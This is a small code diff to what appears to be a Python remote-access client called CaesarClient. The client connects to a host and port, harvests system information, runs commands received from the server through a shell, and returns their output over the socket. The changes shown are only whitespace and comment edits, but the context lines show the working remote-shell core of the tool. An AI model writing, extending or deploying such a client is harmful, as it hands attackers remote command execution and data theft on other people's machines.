@@ -8,6 +8,7 @@ from general_features import GeneralFeatures
 from systeminfo_harvester import SystemInfoHarvester
 
 
+
 class CaesarClient:
 
     def __init__(self, host, port):
@@ -156,7 +157,7 @@ class CaesarClient:
                     self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
             else:
                 try:
-                    #return terminal output back to server
+                    # return terminal output back to server
                     terminal_output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, timeout=30)
                     terminal_output = terminal_output.stdout + terminal_output.stderr
                     terminal_output = terminal_output.decode()
